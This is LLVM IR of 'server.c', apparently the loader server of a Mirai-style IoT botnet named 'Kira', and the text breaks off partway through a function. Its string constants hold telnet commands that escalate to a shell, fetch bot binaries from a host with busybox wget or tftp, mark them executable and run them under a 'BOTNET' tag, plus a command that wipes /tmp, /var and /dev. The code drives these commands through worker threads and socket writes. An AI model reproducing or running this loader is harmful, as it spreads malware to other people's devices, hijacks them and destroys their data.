; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i32, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%union.pthread_mutexattr_t = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.cpu_set_t = type { [16 x i64] }

@.str = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"/bin/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@tmp_dirs = dso_local global [13 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0)], align 16
@.str.13 = private unnamed_addr constant [11 x i8] c"epoll_wait\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [9 x i8] c"enable\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"system\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"linuxshell\0D\0A\00", align 1
@.str.20 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.22 = private unnamed_addr constant [20 x i8] c">%s.misa && cd %s\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [28 x i8] c"/bin/busybox rm -rf %s %s\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"KIRA-SMALLD1CK\00", align 1
@.str.25 = private unnamed_addr constant [13 x i8] c"KIRA-B1GD1CK\00", align 1
@.str.26 = private unnamed_addr constant [121 x i8] c"/bin/busybox cp /bin/busybox KIRA-SMALLD1CK; >KIRA-SMALLD1CK; /bin/busybox chmod 777 KIRA-SMALLD1CK; /bin/busybox Kira\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [81 x i8] c"/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [20 x i8] c"/bin/busybox Kira\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [58 x i8] c"/bin/busybox wget; /bin/busybox tftp; /bin/busybox Kira\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.31 = private unnamed_addr constant [102 x i8] c"/bin/busybox cat /proc/cpuinfo || while read i; do echo $i; done < /proc/cpuinfo; /bin/busybox Kira\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [117 x i8] c"/bin/busybox cp KIRA-SMALLD1CK KIRA-B1GD1CK; >KIRA-B1GD1CK; /bin/busybox chmod 777 KIRA-B1GD1CK; /bin/busybox Kira\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [124 x i8] c"/bin/busybox wget http://%s:%d/bins/%s.%s -O - > KIRA-SMALLD1CK; /bin/busybox chmod 777 KIRA-SMALLD1CK; /bin/busybox Kira\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [6 x i8] c"jKira\00", align 1
@.str.35 = private unnamed_addr constant [99 x i8] c"/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 KIRA-SMALLD1CK; /bin/busybox Kira\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [4 x i8] c"arc\00", align 1
@.str.37 = private unnamed_addr constant [31 x i8] c"./%s %s; /bin/busybox BOTNET\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [55 x i8] c"./%s > %s; ./%s echo.load.%s.%s; /bin/busybox BOTNET\0D\0A\00", align 1
@id_tag = external global i8*, align 8
@.str.39 = private unnamed_addr constant [56 x i8] c"./KIRA-SMALLD1CK wget.load.%s.%s; /bin/busybox BOTNET\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [42 x i8] c"/bin/busybox rm -f /tmp/* /var/* /dev/*\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [43 x i8] c"./KIRA-SMALLD1CK %s; /bin/busybox BOTNET\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [115 x i8] c"/bin/busybox cp /bin/busybox KIRA-B1GD1CK; >KIRA-B1GD1CK; /bin/busybox chmod 777 KIRA-B1GD1CK; /bin/busybox Kira\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.44 = private unnamed_addr constant [61 x i8] c"/bin/busybox rm -rf %s; >KIRA-SMALLD1CK; /bin/busybox Kira\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [62 x i8] c"\03\1Akill %%1\0D\0A/bin/busybox rm -rf KIRA-SMALLD1CK KIRA-B1GD1CK\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local %struct.server* @server_create(i8 zeroext %0, i8 zeroext %1, i32* %2, i32 %3, i8* %4, i16 zeroext %5, i8* %6) #0 {
  %8 = alloca %struct.server*, align 8
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i8*, align 8
  %16 = alloca %struct.server*, align 8
  %17 = alloca %struct.server_worker*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.server_worker*, align 8
  store i8 %0, i8* %9, align 1
  store i8 %1, i8* %10, align 1
  store i32* %2, i32** %11, align 8
  store i32 %3, i32* %12, align 4
  store i8* %4, i8** %13, align 8
  store i16 %5, i16* %14, align 2
  store i8* %6, i8** %15, align 8
  %20 = call noalias align 16 i8* @calloc(i64 1, i64 96) #8
  %21 = bitcast i8* %20 to %struct.server*
  store %struct.server* %21, %struct.server** %16, align 8
  %22 = load i8, i8* %9, align 1
  %23 = zext i8 %22 to i64
  %24 = call noalias align 16 i8* @calloc(i64 %23, i64 32) #8
  %25 = bitcast i8* %24 to %struct.server_worker*
  store %struct.server_worker* %25, %struct.server_worker** %17, align 8
  store i32 0, i32* %18, align 4
  %26 = load i8, i8* %10, align 1
  %27 = load %struct.server*, %struct.server** %16, align 8
  %28 = getelementptr inbounds %struct.server, %struct.server* %27, i32 0, i32 17
  store i8 %26, i8* %28, align 1
  %29 = load i32*, i32** %11, align 8
  %30 = load %struct.server*, %struct.server** %16, align 8
  %31 = getelementptr inbounds %struct.server, %struct.server* %30, i32 0, i32 13
  store i32* %29, i32** %31, align 8
  %32 = load i32, i32* %12, align 4
  %33 = load %struct.server*, %struct.server** %16, align 8
  %34 = getelementptr inbounds %struct.server, %struct.server* %33, i32 0, i32 0
  store i32 %32, i32* %34, align 8
  %35 = load i8*, i8** %13, align 8
  %36 = load %struct.server*, %struct.server** %16, align 8
  %37 = getelementptr inbounds %struct.server, %struct.server* %36, i32 0, i32 9
  store i8* %35, i8** %37, align 8
  %38 = load i16, i16* %14, align 2
  %39 = load %struct.server*, %struct.server** %16, align 8
  %40 = getelementptr inbounds %struct.server, %struct.server* %39, i32 0, i32 15
  store i16 %38, i16* %40, align 8
  %41 = load i8*, i8** %15, align 8
  %42 = load %struct.server*, %struct.server** %16, align 8
  %43 = getelementptr inbounds %struct.server, %struct.server* %42, i32 0, i32 10
  store i8* %41, i8** %43, align 8
  %44 = load i32, i32* %12, align 4
  %45 = mul i32 %44, 2
  %46 = zext i32 %45 to i64
  %47 = call noalias align 16 i8* @calloc(i64 %46, i64 8) #8
  %48 = bitcast i8* %47 to %struct.connection**
  %49 = load %struct.server*, %struct.server** %16, align 8
  %50 = getelementptr inbounds %struct.server, %struct.server* %49, i32 0, i32 12
  store %struct.connection** %48, %struct.connection*** %50, align 8
  %51 = load i8, i8* %9, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias align 16 i8* @calloc(i64 %52, i64 32) #8
  %54 = bitcast i8* %53 to %struct.server_worker*
  %55 = load %struct.server*, %struct.server** %16, align 8
  %56 = getelementptr inbounds %struct.server, %struct.server* %55, i32 0, i32 11
  store %struct.server_worker* %54, %struct.server_worker** %56, align 8
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.server*, %struct.server** %16, align 8
  %59 = getelementptr inbounds %struct.server, %struct.server* %58, i32 0, i32 16
  store i8 %57, i8* %59, align 2
  %60 = load %struct.server*, %struct.server** %16, align 8
  %61 = getelementptr inbounds %struct.server, %struct.server* %60, i32 0, i32 12
  %62 = load %struct.connection**, %struct.connection*** %61, align 8
  %63 = icmp eq %struct.connection** %62, null
  br i1 %63, label %64, label %65

64:                                               ; preds = %7
  call void @exit(i32 0) #9
  unreachable

65:                                               ; preds = %7
  store i32 0, i32* %18, align 4
  br label %66

66:                                               ; preds = %99, %65
  %67 = load i32, i32* %18, align 4
  %68 = load i32, i32* %12, align 4
  %69 = mul i32 %68, 2
  %70 = icmp ult i32 %67, %69
  br i1 %70, label %71, label %102

71:                                               ; preds = %66
  %72 = call noalias align 16 i8* @calloc(i64 1, i64 8928) #8
  %73 = bitcast i8* %72 to %struct.connection*
  %74 = load %struct.server*, %struct.server** %16, align 8
  %75 = getelementptr inbounds %struct.server, %struct.server* %74, i32 0, i32 12
  %76 = load %struct.connection**, %struct.connection*** %75, align 8
  %77 = load i32, i32* %18, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.connection*, %struct.connection** %76, i64 %78
  store %struct.connection* %73, %struct.connection** %79, align 8
  %80 = load %struct.server*, %struct.server** %16, align 8
  %81 = getelementptr inbounds %struct.server, %struct.server* %80, i32 0, i32 12
  %82 = load %struct.connection**, %struct.connection*** %81, align 8
  %83 = load i32, i32* %18, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.connection*, %struct.connection** %82, i64 %84
  %86 = load %struct.connection*, %struct.connection** %85, align 8
  %87 = icmp eq %struct.connection* %86, null
  br i1 %87, label %88, label %89

88:                                               ; preds = %71
  call void @exit(i32 -1) #9
  unreachable

89:                                               ; preds = %71
  %90 = load %struct.server*, %struct.server** %16, align 8
  %91 = getelementptr inbounds %struct.server, %struct.server* %90, i32 0, i32 12
  %92 = load %struct.connection**, %struct.connection*** %91, align 8
  %93 = load i32, i32* %18, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.connection*, %struct.connection** %92, i64 %94
  %96 = load %struct.connection*, %struct.connection** %95, align 8
  %97 = getelementptr inbounds %struct.connection, %struct.connection* %96, i32 0, i32 0
  %98 = call i32 @pthread_mutex_init(%union.pthread_mutex_t* %97, %union.pthread_mutexattr_t* null) #8
  br label %99

99:                                               ; preds = %89
  %100 = load i32, i32* %18, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %18, align 4
  br label %66, !llvm.loop !6

102:                                              ; preds = %66
  store i32 0, i32* %18, align 4
  br label %103

103:                                              ; preds = %139, %102
  %104 = load i32, i32* %18, align 4
  %105 = load i8, i8* %9, align 1
  %106 = zext i8 %105 to i32
  %107 = icmp slt i32 %104, %106
  br i1 %107, label %108, label %142

108:                                              ; preds = %103
  %109 = load %struct.server*, %struct.server** %16, align 8
  %110 = getelementptr inbounds %struct.server, %struct.server* %109, i32 0, i32 11
  %111 = load %struct.server_worker*, %struct.server_worker** %110, align 8
  %112 = load i32, i32* %18, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %111, i64 %113
  store %struct.server_worker* %114, %struct.server_worker** %19, align 8
  %115 = load %struct.server*, %struct.server** %16, align 8
  %116 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %117 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %116, i32 0, i32 0
  store %struct.server* %115, %struct.server** %117, align 8
  %118 = load i32, i32* %18, align 4
  %119 = trunc i32 %118 to i8
  %120 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %121 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %120, i32 0, i32 3
  store i8 %119, i8* %121, align 8
  %122 = call i32 @epoll_create1(i32 0) #8
  %123 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %124 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %123, i32 0, i32 1
  store i32 %122, i32* %124, align 8
  %125 = icmp eq i32 %122, -1
  br i1 %125, label %126, label %133

126:                                              ; preds = %108
  %127 = load %struct.server*, %struct.server** %16, align 8
  %128 = getelementptr inbounds %struct.server, %struct.server* %127, i32 0, i32 11
  %129 = load %struct.server_worker*, %struct.server_worker** %128, align 8
  %130 = bitcast %struct.server_worker* %129 to i8*
  call void @free(i8* %130) #8
  %131 = load %struct.server*, %struct.server** %16, align 8
  %132 = bitcast %struct.server* %131 to i8*
  call void @free(i8* %132) #8
  store %struct.server* null, %struct.server** %8, align 8
  br label %149

133:                                              ; preds = %108
  %134 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %135 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %134, i32 0, i32 2
  %136 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %137 = bitcast %struct.server_worker* %136 to i8*
  %138 = call i32 @pthread_create(i64* %135, %union.pthread_attr_t* null, i8* (i8*)* @worker, i8* %137) #8
  br label %139

139:                                              ; preds = %133
  %140 = load i32, i32* %18, align 4
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %18, align 4
  br label %103, !llvm.loop !8

142:                                              ; preds = %103
  %143 = load %struct.server*, %struct.server** %16, align 8
  %144 = getelementptr inbounds %struct.server, %struct.server* %143, i32 0, i32 14
  %145 = load %struct.server*, %struct.server** %16, align 8
  %146 = bitcast %struct.server* %145 to i8*
  %147 = call i32 @pthread_create(i64* %144, %union.pthread_attr_t* null, i8* (i8*)* @timeout_thread, i8* %146) #8
  %148 = load %struct.server*, %struct.server** %16, align 8
  store %struct.server* %148, %struct.server** %8, align 8
  br label %149

149:                                              ; preds = %142, %126
  %150 = load %struct.server*, %struct.server** %8, align 8
  ret %struct.server* %150
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #2

; Function Attrs: nounwind
declare i32 @pthread_mutex_init(%union.pthread_mutex_t*, %union.pthread_mutexattr_t*) #1

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i8* @worker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.server_worker*, align 8
  %4 = alloca [128 x %struct.epoll_event], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %7 = load i8*, i8** %2, align 8
  %8 = bitcast i8* %7 to %struct.server_worker*
  store %struct.server_worker* %8, %struct.server_worker** %3, align 8
  %9 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %10 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %9, i32 0, i32 3
  %11 = load i8, i8* %10, align 8
  %12 = zext i8 %11 to i32
  call void @bind_core(i32 %12)
  br label %13

13:                                               ; preds = %1, %35
  %14 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %15 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %14, i32 0, i32 1
  %16 = load i32, i32* %15, align 8
  %17 = getelementptr inbounds [128 x %struct.epoll_event], [128 x %struct.epoll_event]* %4, i64 0, i64 0
  %18 = call i32 @epoll_wait(i32 %16, %struct.epoll_event* %17, i32 127, i32 -1)
  store i32 %18, i32* %6, align 4
  %19 = load i32, i32* %6, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

21:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i64 0, i64 0))
  br label %22

22:                                               ; preds = %21, %13
  store i32 0, i32* %5, align 4
  br label %23

23:                                               ; preds = %32, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %6, align 4
  %26 = icmp slt i32 %24, %25
  br i1 %26, label %27, label %35

27:                                               ; preds = %23
  %28 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [128 x %struct.epoll_event], [128 x %struct.epoll_event]* %4, i64 0, i64 %30
  call void @handle_event(%struct.server_worker* %28, %struct.epoll_event* %31)
  br label %32

32:                                               ; preds = %27
  %33 = load i32, i32* %5, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %5, align 4
  br label %23, !llvm.loop !9

35:                                               ; preds = %23
  br label %13
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i8* @timeout_thread(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.server*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.connection*, align 8
  store i8* %0, i8** %2, align 8
  %7 = load i8*, i8** %2, align 8
  %8 = bitcast i8* %7 to %struct.server*
  store %struct.server* %8, %struct.server** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 0, i32* %5, align 4
  br label %9

9:                                                ; preds = %1, %159
  %10 = call i64 @time(i64* null) #8
  %11 = trunc i64 %10 to i32
  store i32 %11, i32* %5, align 4
  store i32 0, i32* %4, align 4
  br label %12

12:                                               ; preds = %156, %9
  %13 = load i32, i32* %4, align 4
  %14 = load %struct.server*, %struct.server** %3, align 8
  %15 = getelementptr inbounds %struct.server, %struct.server* %14, i32 0, i32 0
  %16 = load i32, i32* %15, align 8
  %17 = mul i32 %16, 2
  %18 = icmp ult i32 %13, %17
  br i1 %18, label %19, label %159

19:                                               ; preds = %12
  %20 = load %struct.server*, %struct.server** %3, align 8
  %21 = getelementptr inbounds %struct.server, %struct.server* %20, i32 0, i32 12
  %22 = load %struct.connection**, %struct.connection*** %21, align 8
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.connection*, %struct.connection** %22, i64 %24
  %26 = load %struct.connection*, %struct.connection** %25, align 8
  store %struct.connection* %26, %struct.connection** %6, align 8
  %27 = load %struct.connection*, %struct.connection** %6, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 14
  %29 = load i8, i8* %28, align 4
  %30 = sext i8 %29 to i32
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %32, label %122

32:                                               ; preds = %19
  %33 = load %struct.connection*, %struct.connection** %6, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 9
  %35 = load i64, i64* %34, align 8
  %36 = icmp sgt i64 %35, 0
  br i1 %36, label %37, label %122

37:                                               ; preds = %32
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = load %struct.connection*, %struct.connection** %6, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 9
  %42 = load i64, i64* %41, align 8
  %43 = sub nsw i64 %39, %42
  %44 = load %struct.connection*, %struct.connection** %6, align 8
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %44, i32 0, i32 13
  %46 = load i16, i16* %45, align 2
  %47 = zext i16 %46 to i64
  %48 = icmp sgt i64 %43, %47
  br i1 %48, label %49, label %122

49:                                               ; preds = %37
  %50 = load %struct.connection*, %struct.connection** %6, align 8
  %51 = getelementptr inbounds %struct.connection, %struct.connection* %50, i32 0, i32 10
  %52 = load i32, i32* %51, align 8
  %53 = icmp eq i32 %52, 17
  br i1 %53, label %54, label %119

54:                                               ; preds = %49
  %55 = load %struct.connection*, %struct.connection** %6, align 8
  %56 = getelementptr inbounds %struct.connection, %struct.connection* %55, i32 0, i32 17
  %57 = load i8, i8* %56, align 1
  %58 = icmp ne i8 %57, 0
  br i1 %58, label %119, label %59

59:                                               ; preds = %54
  %60 = load %struct.connection*, %struct.connection** %6, align 8
  %61 = getelementptr inbounds %struct.connection, %struct.connection* %60, i32 0, i32 3
  %62 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %61, i32 0, i32 2
  %63 = getelementptr inbounds [6 x i8], [6 x i8]* %62, i64 0, i64 0
  %64 = call i32 @strncmp(i8* %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i64 0, i64 0), i64 3) #10
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %119

66:                                               ; preds = %59
  %67 = call i64 @time(i64* null) #8
  %68 = load %struct.connection*, %struct.connection** %6, align 8
  %69 = getelementptr inbounds %struct.connection, %struct.connection* %68, i32 0, i32 9
  store i64 %67, i64* %69, align 8
  %70 = load %struct.connection*, %struct.connection** %6, align 8
  %71 = getelementptr inbounds %struct.connection, %struct.connection* %70, i32 0, i32 4
  %72 = load i32, i32* %71, align 8
  %73 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %72, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.45, i64 0, i64 0))
  %74 = load %struct.connection*, %struct.connection** %6, align 8
  %75 = getelementptr inbounds %struct.connection, %struct.connection* %74, i32 0, i32 17
  store i8 1, i8* %75, align 1
  %76 = load %struct.connection*, %struct.connection** %6, align 8
  %77 = getelementptr inbounds %struct.connection, %struct.connection* %76, i32 0, i32 5
  store i32 0, i32* %77, align 4
  %78 = load %struct.connection*, %struct.connection** %6, align 8
  %79 = getelementptr inbounds %struct.connection, %struct.connection* %78, i32 0, i32 6
  store i32 0, i32* %79, align 8
  %80 = load %struct.connection*, %struct.connection** %6, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 7
  store i32 0, i32* %81, align 4
  %82 = load %struct.connection*, %struct.connection** %6, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 8
  store i32 0, i32* %83, align 8
  %84 = load %struct.connection*, %struct.connection** %6, align 8
  %85 = getelementptr inbounds %struct.connection, %struct.connection* %84, i32 0, i32 3
  %86 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %85, i32 0, i32 2
  %87 = getelementptr inbounds [6 x i8], [6 x i8]* %86, i64 0, i64 0
  %88 = load %struct.connection*, %struct.connection** %6, align 8
  %89 = getelementptr inbounds %struct.connection, %struct.connection* %88, i32 0, i32 3
  %90 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %89, i32 0, i32 2
  %91 = getelementptr inbounds [6 x i8], [6 x i8]* %90, i64 0, i64 3
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %93, 0
  %95 = zext i1 %94 to i64
  %96 = select i1 %94, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.43, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i64 0, i64 0)
  %97 = call i8* @strcpy(i8* %87, i8* %96) #8
  %98 = load %struct.connection*, %struct.connection** %6, align 8
  %99 = getelementptr inbounds %struct.connection, %struct.connection* %98, i32 0, i32 3
  %100 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %99, i32 0, i32 2
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* %100, i64 0, i64 0
  %102 = load %struct.connection*, %struct.connection** %6, align 8
  %103 = getelementptr inbounds %struct.connection, %struct.connection* %102, i32 0, i32 3
  %104 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %103, i32 0, i32 2
  %105 = getelementptr inbounds [6 x i8], [6 x i8]* %104, i64 0, i64 0
  %106 = call i64 @strlen(i8* %105) #10
  %107 = trunc i64 %106 to i32
  %108 = call %struct.binary* @binary_get_by_arch(i8* %101, i32 %107)
  %109 = load %struct.connection*, %struct.connection** %6, align 8
  %110 = getelementptr inbounds %struct.connection, %struct.connection* %109, i32 0, i32 2
  store %struct.binary* %108, %struct.binary** %110, align 8
  %111 = load %struct.connection*, %struct.connection** %6, align 8
  %112 = getelementptr inbounds %struct.connection, %struct.connection* %111, i32 0, i32 4
  %113 = load i32, i32* %112, align 8
  %114 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %113, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.29, i64 0, i64 0))
  %115 = load %struct.connection*, %struct.connection** %6, align 8
  %116 = getelementptr inbounds %struct.connection, %struct.connection* %115, i32 0, i32 10
  store i32 13, i32* %116, align 8
  %117 = load %struct.connection*, %struct.connection** %6, align 8
  %118 = getelementptr inbounds %struct.connection, %struct.connection* %117, i32 0, i32 16
  store i8 1, i8* %118, align 2
  br label %121

119:                                              ; preds = %59, %54, %49
  %120 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %120)
  br label %121

121:                                              ; preds = %119, %66
  br label %155

122:                                              ; preds = %37, %32, %19
  %123 = load %struct.connection*, %struct.connection** %6, align 8
  %124 = getelementptr inbounds %struct.connection, %struct.connection* %123, i32 0, i32 14
  %125 = load i8, i8* %124, align 4
  %126 = sext i8 %125 to i32
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %154

128:                                              ; preds = %122
  %129 = load %struct.connection*, %struct.connection** %6, align 8
  %130 = getelementptr inbounds %struct.connection, %struct.connection* %129, i32 0, i32 11
  %131 = getelementptr inbounds %struct.anon, %struct.anon* %130, i32 0, i32 1
  %132 = load i32, i32* %131, align 4
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %154

134:                                              ; preds = %128
  %135 = call i64 @time(i64* null) #8
  %136 = load %struct.connection*, %struct.connection** %6, align 8
  %137 = getelementptr inbounds %struct.connection, %struct.connection* %136, i32 0, i32 11
  %138 = getelementptr inbounds %struct.anon, %struct.anon* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = sext i32 %139 to i64
  %141 = icmp sgt i64 %135, %140
  br i1 %141, label %142, label %154

142:                                              ; preds = %134
  %143 = load %struct.connection*, %struct.connection** %6, align 8
  %144 = getelementptr inbounds %struct.connection, %struct.connection* %143, i32 0, i32 11
  %145 = getelementptr inbounds %struct.anon, %struct.anon* %144, i32 0, i32 1
  store i32 0, i32* %145, align 4
  %146 = load %struct.connection*, %struct.connection** %6, align 8
  %147 = getelementptr inbounds %struct.connection, %struct.connection* %146, i32 0, i32 4
  %148 = load i32, i32* %147, align 8
  %149 = load %struct.connection*, %struct.connection** %6, align 8
  %150 = getelementptr inbounds %struct.connection, %struct.connection* %149, i32 0, i32 11
  %151 = getelementptr inbounds %struct.anon, %struct.anon* %150, i32 0, i32 0
  %152 = getelementptr inbounds [512 x i8], [512 x i8]* %151, i64 0, i64 0
